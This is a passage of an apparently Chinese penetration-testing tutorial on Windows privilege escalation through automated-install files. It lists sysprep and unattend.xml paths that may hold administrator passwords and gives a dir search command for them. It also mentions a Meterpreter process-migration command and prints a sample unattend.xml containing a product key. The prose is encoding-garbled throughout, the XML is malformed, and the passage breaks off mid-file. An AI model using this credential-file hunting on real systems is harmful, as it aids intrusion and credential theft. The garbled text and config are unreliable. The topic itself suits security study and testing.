<p>å¯ä»¥çœ‹åˆ°ä¸ä¸€ä¼šå„¿ä¼šè¯å°±è¢«å…³é—­äº†ï¼Œè¿™æ˜¯ç”±äºå½“â€”ä¸ªè¿›ç¨‹åœ¨Windowsæ“ä½œç³»ç»Ÿä¸­å¯åŠ¨åï¼Œå¿…é¡»ä¸è·ŸåŠ¡æ§åˆ¶ç®¡ç†å™¨è¿›è¡Œé€šä¿¡ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œé€šä¿¡ï¼ŒæœåŠ¡æ§åˆ¶ç®¡ç†å™¨ä¼šè®¤ä¸ºå‡ºç°äº†é”™è¯¯ï¼Œè¿›è€Œç»ˆæ­¢è¿™ä¸ªè¿›ç¨‹ã€‚åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œéœ€è¦åœ¨ç»ˆæ­¢è½½è·è¿›ç¨‹ä¹‹å‰å°†å®ƒè¿ç§»åˆ°å…¶ä»–è¿›ç¨‹ä¸­ï¼ˆå¯ä»¥ä½¿ç”¨<code>set AutoRunScipt migrate -f</code>ï¼Œè‡ªåŠ¨è¿ç§»è¿›ç¨‹å‘½ä»¤ï¼‰</p>
<h3 id="4-2-4-è‡ªåŠ¨å®‰è£…é…ç½®æ–‡ä»¶"><a href="#4-2-4-è‡ªåŠ¨å®‰è£…é…ç½®æ–‡ä»¶" class="headerlink" title="4.2.4 è‡ªåŠ¨å®‰è£…é…ç½®æ–‡ä»¶"></a>4.2.4 è‡ªåŠ¨å®‰è£…é…ç½®æ–‡ä»¶</h3><p>â€‹        ç½‘ç»œç®¡ç†å‘˜åœ¨å†…ç½‘ä¸­ç»™å¤šå°æœºå™¨é…ç½®åŒä¸€ä¸ªç¯å¢ƒæ—¶ï¼Œé€šå¸¸ä¸ä¼šé€å°é…ç½®ï¼Œè€Œä¼šä½¿ç”¨è„šæœ¬åŒ–æ‰¹é‡éƒ¨ç½²çš„æ–¹æ³•ã€‚åœ¨è¿™ä¸€è¿‡ç¨‹ä¸­ï¼Œä¼šä½¿ç”¨å®‰è£…é…ç½®æ–‡ä»¶ã€‚è¿™äº›æ–‡ä»¶ä¸­åŒ…å«æ‰€æœ‰çš„å®‰è£…é…ç½®ä¿¡æ¯ï¼Œå…¶ä¸­çš„ä¸€äº›è¿˜å¯èƒ½åŒ…å«æœ¬åœ°ç®¡ç†å‘˜è´¦å·å’Œå¯†ç ç­‰ä¿¡æ¯ã€‚è¿™äº›æ–‡ä»¶åˆ—ä¸¾å¦‚ä¸‹ï¼ˆå¯ä»¥å¯¹æ•´ä¸ªç³»ç»Ÿè¿›è¡Œæ£€æŸ¥ï¼‰ã€‚</p>
<pre><code class="hljs powershell">C:\sysprep.inf
C:\sysprep\sysprep.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\Panther\unattend.xml</code></pre>

<p>ä¹Ÿå¯ä»¥æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œæœç´¢ <code>Unattend.xml</code>æ–‡ä»¶ï¼Œ<code>Unattend.xml</code>å±äºåº”ç­”æ–‡ä»¶ï¼ˆæ— äººå‚ä¸æ–‡ä»¶ï¼Œå¯ä»¥ç†è§£ä½œè‡ªåŠ¨åŒ–å®‰è£…ç³»ç»Ÿæ–‡ä»¶ï¼‰ï¼Œå¯ç”¨äºåœ¨å®‰è£…æœŸé—´ä¿®æ”¹ä½ çš„æ˜ åƒä¸­çš„ Windows è®¾ç½®ã€‚</p>
<pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> /b /s c:\Unattend.xml</code></pre>

<p>ç¯å¢ƒæ­å»ºå‚è€ƒï¼š</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoyunyun100fen/p/10231108.html">https://www.cnblogs.com/xiaoyunyun100fen/p/10231108.html</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/CasonChan/p/5544346.html">https://www.cnblogs.com/CasonChan/p/5544346.html</a></li>
</ul>
<p>æœ¬æ¬¡ä»¥<code>win7</code>å®¶åº­ç‰ˆä¸ºä¾‹ï¼šæµ‹è¯•ä½¿ç”¨<code>unattend.xml</code>å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">unattend</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;urn:schemas-microsoft-com:unattend&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">settings</span> <span class="hljs-attr">pass</span>=<span class="hljs-string">&quot;windowsPE&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-International-Core-WinPE&quot;</span> <span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;x86&quot;</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span> <span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SetupUILanguage</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">UILanguage</span>&gt;</span>zh-cn<span class="hljs-tag">&lt;/<span class="hljs-name">UILanguage</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">SetupUILanguage</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">InputLocale</span>&gt;</span>zh-cn<span class="hljs-tag">&lt;/<span class="hljs-name">InputLocale</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SystemLocale</span>&gt;</span>zh-cn<span class="hljs-tag">&lt;/<span class="hljs-name">SystemLocale</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">UILanguage</span>&gt;</span>zh-cn<span class="hljs-tag">&lt;/<span class="hljs-name">UILanguage</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">UserLocale</span>&gt;</span>zh-cn<span class="hljs-tag">&lt;/<span class="hljs-name">UserLocale</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-International-Core-WinPE&quot;</span> <span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;amd64&quot;</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span> <span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SetupUILanguage</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">UILanguage</span>&gt;</span>zh-cn<span class="hljs-tag">&lt;/<span class="hljs-name">UILanguage</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">SetupUILanguage</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">InputLocale</span>&gt;</span>zh-cn<span class="hljs-tag">&lt;/<span class="hljs-name">InputLocale</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SystemLocale</span>&gt;</span>zh-cn<span class="hljs-tag">&lt;/<span class="hljs-name">SystemLocale</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">UILanguage</span>&gt;</span>zh-cn<span class="hljs-tag">&lt;/<span class="hljs-name">UILanguage</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">UserLocale</span>&gt;</span>zh-cn<span class="hljs-tag">&lt;/<span class="hljs-name">UserLocale</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-Setup&quot;</span> <span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;x86&quot;</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span> <span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Diagnostics</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">OptIn</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">OptIn</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">Diagnostics</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">DiskConfiguration</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">WillShowUI</span>&gt;</span>OnError<span class="hljs-tag">&lt;/<span class="hljs-name">WillShowUI</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Disk</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">DiskID</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">DiskID</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">WillWipeDisk</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">WillWipeDisk</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">CreatePartitions</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">CreatePartition</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Order</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">Order</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Type</span>&gt;</span>Primary<span class="hljs-tag">&lt;/<span class="hljs-name">Type</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Size</span>&gt;</span>100<span class="hljs-tag">&lt;/<span class="hljs-name">Size</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">CreatePartition</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">CreatePartition</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Order</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">Order</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Type</span>&gt;</span>Primary<span class="hljs-tag">&lt;/<span class="hljs-name">Type</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Extend</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Extend</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">CreatePartition</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">CreatePartitions</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">ModifyPartitions</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">ModifyPartition</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Format</span>&gt;</span>NTFS<span class="hljs-tag">&lt;/<span class="hljs-name">Format</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Label</span>&gt;</span>System Reserved<span class="hljs-tag">&lt;/<span class="hljs-name">Label</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Order</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">Order</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Active</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Active</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">PartitionID</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">PartitionID</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">TypeID</span>&gt;</span>0x27<span class="hljs-tag">&lt;/<span class="hljs-name">TypeID</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ModifyPartition</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">ModifyPartition</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Active</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Active</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Format</span>&gt;</span>NTFS<span class="hljs-tag">&lt;/<span class="hljs-name">Format</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Label</span>&gt;</span>OS<span class="hljs-tag">&lt;/<span class="hljs-name">Label</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Letter</span>&gt;</span>C<span class="hljs-tag">&lt;/<span class="hljs-name">Letter</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Order</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">Order</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">PartitionID</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">PartitionID</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ModifyPartition</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ModifyPartitions</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">Disk</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">DiskConfiguration</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">ImageInstall</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">OSImage</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">InstallTo</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">DiskID</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">DiskID</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">PartitionID</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">PartitionID</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">InstallTo</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">WillShowUI</span>&gt;</span>OnError<span class="hljs-tag">&lt;/<span class="hljs-name">WillShowUI</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">InstallToAvailablePartition</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">InstallToAvailablePartition</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">OSImage</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ImageInstall</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">UserData</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">AcceptEula</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">AcceptEula</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">FullName</span>&gt;</span>administrator<span class="hljs-tag">&lt;/<span class="hljs-name">FullName</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Organization</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Organization</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">UserData</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">EnableFirewall</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">EnableFirewall</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-Setup&quot;</span> <span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;amd64&quot;</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span> <span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Diagnostics</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">OptIn</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">OptIn</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">Diagnostics</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">DiskConfiguration</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">WillShowUI</span>&gt;</span>OnError<span class="hljs-tag">&lt;/<span class="hljs-name">WillShowUI</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Disk</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">DiskID</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">DiskID</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">WillWipeDisk</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">WillWipeDisk</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">CreatePartitions</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">CreatePartition</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Order</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">Order</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Type</span>&gt;</span>Primary<span class="hljs-tag">&lt;/<span class="hljs-name">Type</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Size</span>&gt;</span>100<span class="hljs-tag">&lt;/<span class="hljs-name">Size</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">CreatePartition</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">CreatePartition</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Order</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">Order</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Type</span>&gt;</span>Primary<span class="hljs-tag">&lt;/<span class="hljs-name">Type</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Extend</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Extend</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">CreatePartition</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">CreatePartitions</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">ModifyPartitions</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">ModifyPartition</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Format</span>&gt;</span>NTFS<span class="hljs-tag">&lt;/<span class="hljs-name">Format</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Label</span>&gt;</span>System Reserved<span class="hljs-tag">&lt;/<span class="hljs-name">Label</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Order</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">Order</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Active</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Active</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">PartitionID</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">PartitionID</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">TypeID</span>&gt;</span>0x27<span class="hljs-tag">&lt;/<span class="hljs-name">TypeID</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ModifyPartition</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">ModifyPartition</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Active</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Active</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Format</span>&gt;</span>NTFS<span class="hljs-tag">&lt;/<span class="hljs-name">Format</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Label</span>&gt;</span>OS<span class="hljs-tag">&lt;/<span class="hljs-name">Label</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Letter</span>&gt;</span>C<span class="hljs-tag">&lt;/<span class="hljs-name">Letter</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Order</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">Order</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">PartitionID</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">PartitionID</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ModifyPartition</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ModifyPartitions</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">Disk</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">DiskConfiguration</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">ImageInstall</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">OSImage</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">InstallTo</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">DiskID</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">DiskID</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">PartitionID</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">PartitionID</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">InstallTo</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">WillShowUI</span>&gt;</span>OnError<span class="hljs-tag">&lt;/<span class="hljs-name">WillShowUI</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">InstallToAvailablePartition</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">InstallToAvailablePartition</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">OSImage</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ImageInstall</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">UserData</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">AcceptEula</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">AcceptEula</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">FullName</span>&gt;</span>administrator<span class="hljs-tag">&lt;/<span class="hljs-name">FullName</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Organization</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Organization</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">UserData</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">EnableFirewall</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">EnableFirewall</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">settings</span> <span class="hljs-attr">pass</span>=<span class="hljs-string">&quot;generalize&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">settings</span> <span class="hljs-attr">pass</span>=<span class="hljs-string">&quot;generalize&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-Security-SPP&quot;</span> <span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;amd64&quot;</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span> <span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SkipRearm</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">SkipRearm</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-Security-SPP-UX&quot;</span> <span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;amd64&quot;</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span> <span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SkipAutoActivation</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">SkipAutoActivation</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-Shell-Setup&quot;</span> <span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;amd64&quot;</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span> <span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">ComputerName</span>&gt;</span>-PC<span class="hljs-tag">&lt;/<span class="hljs-name">ComputerName</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">ProductKey</span>&gt;</span>HYF8J-CVRMY-CM74G-RPHKF-PW487<span class="hljs-tag">&lt;/<span class="hljs-name">ProductKey</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">TimeZone</span>&gt;</span>China Standard Time<span class="hljs-tag">&lt;/<span class="hljs-name">TimeZone</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">settings</span> <span class="hljs-attr">pass</span>=<span class="hljs-string">&quot;oobeSystem&quot;</span>&gt;</span>
